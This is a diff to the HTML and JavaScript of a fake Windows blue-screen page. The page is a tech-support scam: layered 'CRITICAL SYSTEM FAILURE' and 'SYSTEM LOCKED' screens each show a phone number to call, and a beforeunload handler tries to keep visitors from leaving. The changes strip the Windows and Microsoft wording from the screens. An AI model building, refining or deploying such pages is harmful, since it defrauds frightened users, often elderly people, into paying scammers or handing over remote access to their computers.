@@ -265,7 +265,7 @@
   <!-- ===== LAYER 1: BLACK BSOD ===== -->
   <div id="bsod-layer-1">
     <div class="bsod-container">
-      <div class="error-title">Your PC ran into a problem and needs to restart.</div>
+      <div class="error-title">Your Device ran into a problem.</div>
       <div class="error-message">We're just collecting some error info, and then we'll restart for you.</div>
 
       <div class="progress-section">
@@ -276,7 +276,7 @@
       </div>
 
       <div class="bsod-phone-container">
-        <div class="bsod-phone-label">If you call a support person, give them this number:</div>
+        <div class="bsod-phone-label">Contact Support:</div>
         <a href="tel:+18332249350" class="bsod-phone-number" id="phone1">+1 (833) 224-9350</a>
       </div>
 
@@ -285,7 +285,7 @@
         <div class="stop-code-value">CRITICAL_PROCESS_DIED</div>
       </div>
 
-      <div class="bsod-footer">Windows Critical Error • Contact Support</div>
+      <div class="bsod-footer">Critical Error • Contact Support</div>
     </div>
   </div>
 
@@ -293,7 +293,7 @@
   <div id="bsod-layer-2">
     <div class="critical-screen">
       <h1>CRITICAL SYSTEM FAILURE</h1>
-      <p style="font-size: clamp(18px, 4vw, 24px); margin: 20px 0;">Your system has been locked</p>
+      <p style="font-size: clamp(18px, 4vw, 24px); margin: 20px 0;">Your Device has been blocked</p>
       <a href="tel:+18332249350" class="phone" id="phone2">+1 (833) 224-9350</a>
       <p style="margin: 30px 0; font-size: clamp(16px, 4vw, 18px;">Immediate action required</p>
     </div>
@@ -303,7 +303,7 @@
   <div id="bsod-layer-3">
     <div class="lock-screen">
       <h1>SYSTEM LOCKED</h1>
-      <p style="font-size: clamp(20px, 5vw, 28px); margin-bottom: 20px;">Call Microsoft Support</p>
+      <p style="font-size: clamp(20px, 5vw, 28px); margin-bottom: 20px;">Call Support</p>
       <a href="tel:+18332249350" class="big-phone" id="phone3">+1 (833) 224-9350</a>
     </div>
   </div>
@@ -460,7 +460,7 @@
       // ===== PREVENT UNLOAD =====
       window.addEventListener('beforeunload', function(e) {
         e.preventDefault();
-        e.returnValue = 'CRITICAL: System locked. Call +1(833)224-9350 immediately.';
+        e.returnValue = 'CRITICAL. Call +1(833)224-9350 immediately.';
         return e.returnValue;
       });
       
